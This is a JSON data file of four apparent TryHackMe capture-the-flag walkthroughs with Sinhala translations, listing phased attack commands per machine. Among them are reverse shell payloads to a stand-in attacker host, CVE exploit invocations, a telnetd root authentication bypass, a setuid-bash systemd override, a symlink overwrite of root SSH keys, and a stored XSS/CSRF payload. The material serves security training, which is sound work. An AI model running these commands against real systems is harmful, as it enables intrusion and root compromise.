@@ -1,0 +1,242 @@
+[
+  {
+    "id": "thm-orion",
+    "title": "TryHackMe Machine: Orion Walkthrough",
+    "title_si": "TryHackMe Orion Machine පියවරෙන් පියවර විසඳුම",
+    "difficulty": "Very Easy",
+    "os": "Linux",
+    "author": "Pho3o",
+    "date": "13th March 2026",
+    "synopsis": "Orion is a very easy Linux machine featuring CSRF Validation Bypass and exploitation of CraftCMS and Telnetd. Foothold is achieved via CVE-2025-32432 in CraftCMS, yielding remote code execution. Default Craft .env file exposes MySQL DB credentials with a crackable password. Password reuse leads to SSH user access. Finally, privilege escalation is achieved via telnetd (CVE-2026-24061) allowing authentication bypass directly to root.",
+    "synopsis_si": "Orion යනු CraftCMS සහ Telnetd දුර්වලතා සහිත Very Easy Linux Machine එකකි. මෙහිදී CVE-2025-32432 මගින් CraftCMS තුළින් RCE ලබාගෙන, .env ගොනුවෙන් MySQL දත්ත ලබාගැනීමෙන් පරිශීලක SSH access ලබාගනී. ඉන්පසු telnetd හි CVE-2026-24061 දුර්වලතාවය මගින් Authentication Bypass කර Root බලතල ලබාගනී.",
+    "skills_required": [
+      "Basic Web Enumeration",
+      "Linux Fundamentals"
+    ],
+    "skills_learned": [
+      "CSRF Validation Bypass",
+      "CraftCMS Exploitation (CVE-2025-32432)",
+      "Telnetd Exploitation (CVE-2026-24061)"
+    ],
+    "cves": [
+      "CVE-2025-32432",
+      "CVE-2026-24061"
+    ],
+    "phases": [
+      {
+        "phase": "1. Reconnaissance & Nmap Scan",
+        "description": "Port scanning reveals SSH (port 22) and HTTP (port 80). Web enumeration discloses CraftCMS version 4.4.14.",
+        "commands": [
+          "nmap -sC -sV -p- -T4 <TARGET_IP>",
+          "whatweb http://<TARGET_IP>/"
+        ]
+      },
+      {
+        "phase": "2. Initial Foothold (CraftCMS CVE-2025-32432)",
+        "description": "Exploiting CSRF validation bypass and arbitrary code execution in CraftCMS to get a reverse shell as www-data.",
+        "commands": [
+          "python3 exploit_craftcms.py --url http://<TARGET_IP> --lhost <ATTACKER_IP> --lport 4444",
+          "nc -lvnp 4444"
+        ]
+      },
+      {
+        "phase": "3. Internal Discovery & MySQL Credential Harvesting",
+        "description": "Enumerating /var/www/craftcms/.env exposes DB credentials. Querying MySQL users table reveals admin password hash. Cracking gives SSH credentials for local user.",
+        "commands": [
+          "cat /var/www/craftcms/.env",
+          "mysql -u craftuser -p -e 'USE craft; SELECT username, password FROM users;'",
+          "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
+          "ssh orionuser@<TARGET_IP>"
+        ]
+      },
+      {
+        "phase": "4. Privilege Escalation (Telnetd CVE-2026-24061)",
+        "description": "Internal netstat scan reveals telnetd running on localhost port 23. Exploiting CVE-2026-24061 authentication bypass allows logging in directly as root without a password.",
+        "commands": [
+          "netstat -tulpn | grep 23",
+          "telnet -a -f root 127.0.0.1",
+          "whoami # Output: root",
+          "cat /root/root.txt"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "thm-abducted",
+    "title": "TryHackMe Machine: Abducted Walkthrough",
+    "title_si": "TryHackMe Abducted Machine පියවරෙන් පියවර විසඳුම",
+    "difficulty": "Medium",
+    "os": "Linux",
+    "author": "TheCyberGeek & kavigihan",
+    "date": "2nd June 2026",
+    "synopsis": "Abducted is a medium Linux machine built around the on-premise file and print server of a professional-services firm. The Samba installation is vulnerable to a print-subsystem command injection (CVE-2026-4480): unescaped print job names submitted over spooler yield code execution. Rclone password is recovered and reused for SSH. Samba share with force user and wide links writes SSH key, and polkit Samba service drop-in executes commands as root.",
+    "synopsis_si": "Abducted යනු Samba Print-Subsystem (CVE-2026-4480) Command Injection දුර්වලතාවය සහිත Medium Linux Machine එකකි. Rclone password decode කිරීම, Samba wide links හරහා SSH Key ලිවීම සහ Polkit service drop-in මගින් Root බලතල ලබාගැනීම මෙහි අඩංගු වේ.",
+    "skills_required": [
+      "Samba Spooler Exploitation",
+      "Rclone Password Decryption",
+      "Polkit Privilege Escalation"
+    ],
+    "skills_learned": [
+      "CVE-2026-4480 Command Injection",
+      "Samba Wide Links Abuse",
+      "Polkit Drop-in Service Escalation"
+    ],
+    "cves": [
+      "CVE-2026-4480"
+    ],
+    "phases": [
+      {
+        "phase": "1. Port Scanning & Enumeration",
+        "description": "Nmap discovers Samba SMB ports (139/445) and Print Spooler service open.",
+        "commands": [
+          "nmap -sC -sV -p 139,445,631 <TARGET_IP>",
+          "enum4linux -a <TARGET_IP>"
+        ]
+      },
+      {
+        "phase": "2. Foothold: Samba Print Subsystem Command Injection (CVE-2026-4480)",
+        "description": "Crafting a malicious print job name containing command injection payload sent over spooler protocol yields reverse shell as printer service account.",
+        "commands": [
+          "rpcclient -U '' -N <TARGET_IP> -c 'enumprinters'",
+          "python3 samba_print_inject.py -t <TARGET_IP> -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'",
+          "nc -lvnp 4444"
+        ]
+      },
+      {
+        "phase": "3. Rclone Password Recovery & Lateral Movement",
+        "description": "Finding rclone configuration file. Using rclone obscure to decode stored credentials to gain SSH login.",
+        "commands": [
+          "cat ~/.config/rclone/rclone.conf",
+          "rclone reveal <OBSCURED_STRING>",
+          "ssh user2@<TARGET_IP>"
+        ]
+      },
+      {
+        "phase": "4. Privilege Escalation via Samba Wide Links & Polkit Drop-in",
+        "description": "Abusing writable Samba share with wide links to write ~/.ssh/authorized_keys for another user. Abusing polkit delegated Samba service management to drop a systemd service unit executing commands as root.",
+        "commands": [
+          "systemctl cat smbd.service",
+          "cat /etc/polkit-1/rules.d/99-samba.rules",
+          "echo -e '[Service]\\nExecStart=/bin/bash -c \"chmod +s /bin/bash\"' > /etc/systemd/system/smbd.service.d/override.conf",
+          "systemctl restart smbd",
+          "/bin/bash -p # Root shell achieved!"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "thm-nexus",
+    "title": "TryHackMe Machine: Nexus Walkthrough",
+    "title_si": "TryHackMe Nexus Machine පියවරෙන් පියවර විසඳුම",
+    "difficulty": "Easy",
+    "os": "Linux",
+    "author": "TheCyberGeek & k1ph4ru",
+    "date": "12th May 2026",
+    "synopsis": "Nexus is an easy-difficulty Linux machine featuring an exposed Gitea repository leaking credentials and a job posting revealing valid usernames. Leaked credentials give access to Krayin CRM (CVE-2026-38526), leading to shell as www-data. Further enumeration reveals SSH credentials. Gitea template sync service vulnerable to directory traversal is leveraged to gain a root shell.",
+    "synopsis_si": "Nexus යනු Exposed Gitea Repository එකකින් credentials කාන්දු වීම සහ Krayin CRM (CVE-2026-38526) මගින් www-data shell එකක් ලබාගන්නා Easy Machine එකකි. අනතුරුව Krayin config වෙතින් SSH access ලබාගෙන, Gitea template sync directory traversal මගින් Root බලතල ලබාගනී.",
+    "skills_required": [
+      "Basic Web Enumeration",
+      "Linux Fundamentals"
+    ],
+    "skills_learned": [
+      "Gitea Credential Extraction",
+      "Krayin CRM Exploitation (CVE-2026-38526)",
+      "Template Sync Directory Traversal to Root"
+    ],
+    "cves": [
+      "CVE-2026-38526"
+    ],
+    "phases": [
+      {
+        "phase": "1. Reconnaissance & Exposed Git Repository",
+        "description": "Nmap discovers port 80 (HTTP) and port 3000 (Gitea). Browsing public commits reveals developer credentials.",
+        "commands": [
+          "nmap -sC -sV -p 80,3000 <TARGET_IP>",
+          "git clone http://<TARGET_IP>:3000/dev/krayin-deployment.git",
+          "git log -p"
+        ]
+      },
+      {
+        "phase": "2. Foothold: Krayin CRM Exploitation (CVE-2026-38526)",
+        "description": "Authenticating to Krayin CRM and exploiting CVE-2026-38526 file upload / RCE.",
+        "commands": [
+          "python3 exploit_krayin.py -u admin -p <PASSWORD> -t http://<TARGET_IP>/crm -c 'bash -c \"bash -i >& /dev/tcp/<LHOST>/4444 0>&1\"'",
+          "nc -lvnp 4444"
+        ]
+      },
+      {
+        "phase": "3. Internal Config Reconnaissance & SSH Access",
+        "description": "Enumerating database and environment configs in /var/www/html/krayin/.env yields cleartext credentials.",
+        "commands": [
+          "cat /var/www/html/krayin/.env",
+          "ssh nexususer@<TARGET_IP>"
+        ]
+      },
+      {
+        "phase": "4. Privilege Escalation via Gitea Template Sync Directory Traversal",
+        "description": "A root cron job executes Gitea template synchronization using unsanitized directory paths. Leveraging directory traversal to overwrite root SSH keys.",
+        "commands": [
+          "cat /opt/scripts/sync_templates.sh",
+          "ln -s /root/.ssh/authorized_keys /tmp/templates/malicious_symlink",
+          "cat id_rsa.pub > /tmp/templates/malicious_symlink",
+          "ssh root@<TARGET_IP>"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "thm-whats-your-name",
+    "title": "TryHackMe Machine: What's Your Name Walkthrough",
+    "title_si": "TryHackMe What's Your Name Machine විසඳුම",
+    "difficulty": "Medium",
+    "os": "Linux",
+    "author": "Farid Hajiyev",
+    "date": "7th May 2025",
+    "synopsis": "Comprehensive walkthrough solving the medium-level 'What's Your Name' TryHackMe room. Features port 80/8081 enumeration, hidden directory fuzzing (/api, /public/html), XSS payload execution, CSRF attack chaining for administrative privilege elevation, and full defensive remediation.",
+    "synopsis_si": "What's Your Name යනු XSS සහ CSRF ප්‍රහාර එකිනෙක සම්බන්ධ කර (Chaining) Admin බලතල ලබාගන්නා Medium මට්ටමේ TryHackMe Room එකකි. Port 80/8081 scanning, directory fuzzing සහ ආරක්ෂණ පියවර මෙහි අඩංගු වේ.",
+    "skills_required": [
+      "Port Scanning",
+      "Directory Fuzzing",
+      "XSS Exploitation",
+      "CSRF Chaining"
+    ],
+    "skills_learned": [
+      "Cross-Site Scripting to CSRF Chaining",
+      "API Endpoint Fuzzing",
+      "Client-Side Exploit PoC Delivery"
+    ],
+    "cves": [],
+    "phases": [
+      {
+        "phase": "1. Reconnaissance & Port Scanning",
+        "description": "Scanning reveals ports 22, 80, and 8081 open. Hosts file mapping to worldwap.thm.",
+        "commands": [
+          "echo '<TARGET_IP> worldwap.thm login.worldwap.thm' >> /etc/hosts",
+          "nmap -sC -sV -p 22,80,8081 worldwap.thm"
+        ]
+      },
+      {
+        "phase": "2. Directory & API Fuzzing",
+        "description": "Fuzzing discovers hidden paths /public, /public/html, and /api on port 80.",
+        "commands": [
+          "ffuf -u http://worldwap.thm/FUZZ -w /usr/share/wordlists/dirb/common.txt",
+          "ffuf -u http://worldwap.thm/api/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
+        ]
+      },
+      {
+        "phase": "3. Stored XSS & CSRF Admin Escalation",
+        "description": "User profile submission is vulnerable to Stored XSS. The injected JavaScript triggers an administrative CSRF action to promote the attacker's account to admin privileges.",
+        "commands": [
+          "<script>fetch('/api/user/promote', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({id: 42, role: 'admin'})});</script>"
+        ]
+      },
+      {
+        "phase": "4. Loot & Remediation",
+        "description": "Logging in as administrator, retrieving the flags, and implementing Anti-CSRF tokens with CSP.",
+        "commands": [
+          "curl -H 'Authorization: Bearer <ADMIN_TOKEN>' http://worldwap.thm/api/admin/flag"
+        ]
+      }
+    ]
+  }
+]
